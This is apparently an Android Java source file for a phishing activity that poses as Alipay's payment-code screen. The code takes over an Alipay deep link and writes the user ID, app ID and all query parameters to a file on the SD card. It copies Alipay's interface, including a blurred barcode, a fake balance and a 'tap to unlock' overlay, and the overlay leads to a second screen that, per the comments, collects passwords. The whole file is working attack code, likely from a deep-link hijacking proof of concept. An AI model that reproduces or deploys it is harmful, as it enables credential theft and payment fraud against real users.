package com.attacker.xiaobu;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.FileOutputStream;
import java.util.Set;

/**
 * 钓鱼第一层 - 伪造支付宝付款码页面
 * 显示打码的付款码 + "点击解锁"按钮
 * 点击解锁后跳转PhishInputActivity收集密码
 */
public class AlipayPhishActivity extends Activity {
    private static final String TAG = "AlipayPhish";
    private static final String OUT = "/sdcard/deeplink_hijack.txt";
    private Uri deeplinkUri;
    private String userId;
    private String appId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        deeplinkUri = getIntent().getData();
        userId = deeplinkUri != null ? deeplinkUri.getQueryParameter("shareUserId") : "未知";
        appId = deeplinkUri != null ? deeplinkUri.getQueryParameter("appId") : "未知";

        String funcName = "付款码";
        if ("20000056".equals(appId)) funcName = "付款码";
        else if ("10000007".equals(appId)) funcName = "扫一扫";

        Log.i(TAG, "🚨 截获DeepLink: userId=" + userId + " appId=" + appId);
        logCapture();

        // 获取屏幕尺寸
        DisplayMetrics dm = getResources().getDisplayMetrics();
        int screenH = dm.heightPixels;

        // 整体ScrollView布局
        ScrollView scroll = new ScrollView(this);
        scroll.setFillViewport(true);
        scroll.setBackgroundColor(Color.WHITE);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.WHITE);
        root.setMinimumHeight(screenH);

        // === 顶部蓝色导航栏 ===
        LinearLayout topBar = new LinearLayout(this);
        topBar.setOrientation(LinearLayout.HORIZONTAL);
        topBar.setGravity(Gravity.CENTER_VERTICAL);
        topBar.setBackgroundColor(0xFF1677FF);
        topBar.setPadding(20, 12, 20, 12);

        TextView backBtn = new TextView(this);
        backBtn.setText("‹ 返回");
        backBtn.setTextSize(16);
        backBtn.setTextColor(Color.WHITE);
        backBtn.setOnClickListener(v -> finish());
        topBar.addView(backBtn);

        TextView topTitle = new TextView(this);
        topTitle.setText("支付宝");
        topTitle.setTextSize(18);
        topTitle.setTextColor(Color.WHITE);
        LinearLayout.LayoutParams tp = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1.0f);
        topTitle.setGravity(Gravity.CENTER);
        topTitle.setLayoutParams(tp);
        topBar.addView(topTitle);

        TextView spacer = new TextView(this);
        spacer.setText("      ");
        spacer.setTextSize(16);
        topBar.addView(spacer);
        root.addView(topBar);

        // === 功能标签 ===
        TextView funcLabel = new TextView(this);
        funcLabel.setText(funcName);
        funcLabel.setTextSize(20);
        funcLabel.setTextColor(0xFF333333);
        funcLabel.setGravity(Gravity.CENTER);
        funcLabel.setPadding(0, 20, 0, 4);
        root.addView(funcLabel);

        TextView funcSub = new TextView(this);
        funcSub.setText("向商家出示" + funcName);
        funcSub.setTextSize(13);
        funcSub.setTextColor(0xFF999999);
        funcSub.setGravity(Gravity.CENTER);
        funcSub.setPadding(0, 0, 0, 16);
        root.addView(funcSub);

        // === 付款码区域（打码）- 居中, 比例适配 ===
        int codeW = dm.widthPixels - 60;
        int codeH = (int)(codeW * 0.75);  // 4:3比例

        FrameLayout codeArea = new FrameLayout(this);
        codeArea.setBackgroundColor(0xFFF5F5F5);
        LinearLayout.LayoutParams clp = new LinearLayout.LayoutParams(codeW, codeH);
        clp.gravity = Gravity.CENTER_HORIZONTAL;
        clp.setMargins(0, 8, 0, 8);
        codeArea.setLayoutParams(clp);

        // 模拟条形码
        LinearLayout barcodeArea = new LinearLayout(this);
        barcodeArea.setOrientation(LinearLayout.VERTICAL);
        barcodeArea.setGravity(Gravity.CENTER);
        barcodeArea.setPadding(20, codeH / 10, 20, 20);

        LinearLayout bars = new LinearLayout(this);
        bars.setOrientation(LinearLayout.HORIZONTAL);
        bars.setGravity(Gravity.CENTER);
        for (int i = 0; i < 30; i++) {
            View bar = new View(this);
            int w = (i % 5 == 0) ? 6 : (i % 3 == 0 ? 4 : 2);
            LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(w, 80);
            bp.setMargins(1, 0, 1, 0);
            bar.setLayoutParams(bp);
            bar.setBackgroundColor(0xFF333333);
            bars.addView(bar);
        }
        barcodeArea.addView(bars);

        TextView codeNum = new TextView(this);
        codeNum.setText("28 08831 08477 2226");
        codeNum.setTextSize(14);
        codeNum.setTextColor(0xFF666666);
        codeNum.setPadding(0, 8, 0, 16);
        barcodeArea.addView(codeNum);

        View qrPlaceholder = new View(this);
        qrPlaceholder.setBackgroundColor(0xFF999999);
        LinearLayout.LayoutParams qp = new LinearLayout.LayoutParams(codeH / 3, codeH / 3);
        qp.setMargins(0, 4, 0, 0);
        qrPlaceholder.setLayoutParams(qp);
        barcodeArea.addView(qrPlaceholder);

        codeArea.addView(barcodeArea);

        // 模糊覆盖层
        LinearLayout blurOverlay = new LinearLayout(this);
        blurOverlay.setGravity(Gravity.CENTER);
        blurOverlay.setBackgroundColor(0xEECCCCCC);
        FrameLayout.LayoutParams blp = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT);
        blurOverlay.setLayoutParams(blp);

        LinearLayout lockBox = new LinearLayout(this);
        lockBox.setOrientation(LinearLayout.VERTICAL);
        lockBox.setGravity(Gravity.CENTER);

        TextView lockIcon = new TextView(this);
        lockIcon.setText("🔒");
        lockIcon.setTextSize(48);
        lockIcon.setGravity(Gravity.CENTER);
        lockBox.addView(lockIcon);

        TextView lockText = new TextView(this);
        lockText.setText("点击解锁");
        lockText.setTextSize(18);
        lockText.setTextColor(0xFF1677FF);
        lockText.setGravity(Gravity.CENTER);
        lockText.setPadding(0, 8, 0, 0);
        lockBox.addView(lockText);

        blurOverlay.setOnClickListener(v -> {
            Intent intent = new Intent(this, PhishInputActivity.class);
            if (deeplinkUri != null) intent.setData(deeplinkUri);
            startActivity(intent);
        });
        blurOverlay.addView(lockBox);
        codeArea.addView(blurOverlay);
        root.addView(codeArea);

        // === 提示文字 ===
        TextView tip = new TextView(this);
        tip.setText("付款码仅限本人使用，请勿截图发送给他人");
        tip.setTextSize(11);
        tip.setTextColor(0xFFFF9800);
        tip.setGravity(Gravity.CENTER);
        tip.setPadding(30, 8, 30, 0);
        root.addView(tip);

        // === 虚假余额显示 ===
        TextView balanceArea = new TextView(this);
        balanceArea.setText("余额宝  ¥12,580.63");
        balanceArea.setTextSize(13);
        balanceArea.setTextColor(0xFF333333);
        balanceArea.setGravity(Gravity.CENTER);
        balanceArea.setPadding(0, 16, 0, 8);
        root.addView(balanceArea);

        // === 底部按钮 ===
        Button btnSwitch = new Button(this);
        btnSwitch.setText("切换为收钱码");
        btnSwitch.setTextSize(14);
        btnSwitch.setTextColor(0xFF1677FF);
        btnSwitch.setBackgroundColor(0x00000000);
        btnSwitch.setPadding(0, 14, 0, 14);
        btnSwitch.setOnClickListener(v -> {
            try {
                Intent intent = new Intent(Intent.ACTION_VIEW, deeplinkUri);
                intent.setPackage("com.eg.android.AlipayGphone");
                startActivity(intent);
            } catch (Exception e) {
                Log.w(TAG, "无法打开支付宝: " + e.getMessage());
            }
            finish();
        });
        root.addView(btnSwitch);

        scroll.addView(root);
        setContentView(scroll);
    }

    private void logCapture() {
        StringBuilder sb = new StringBuilder();
        sb.append("\n=== 钓鱼截获 ===\n");
        sb.append("时间: ").append(new java.util.Date()).append("\n");
        sb.append("URI: ").append(deeplinkUri != null ? deeplinkUri.toString() : "null").append("\n");
        sb.append("appId: ").append(appId).append("\n");
        sb.append("userId: ").append(userId).append("\n");
        if (deeplinkUri != null) {
            Set<String> params = deeplinkUri.getQueryParameterNames();
            if (params != null) {
                sb.append("参数:\n");
                for (String key : params) {
                    sb.append("  ").append(key).append("=")
                      .append(deeplinkUri.getQueryParameter(key)).append("\n");
                }
            }
        }
        sb.append("---\n");
        try {
            String existing = "";
            try { java.io.FileInputStream fis = new java.io.FileInputStream(OUT);
                  byte[] d = new byte[fis.available()]; fis.read(d); fis.close();
                  existing = new String(d, "UTF-8"); } catch (Exception e) {}
            FileOutputStream fos = new FileOutputStream(OUT);
            fos.write((existing + sb.toString()).getBytes("UTF-8"));
            fos.close();
        } catch (Exception e) {}
    }
}
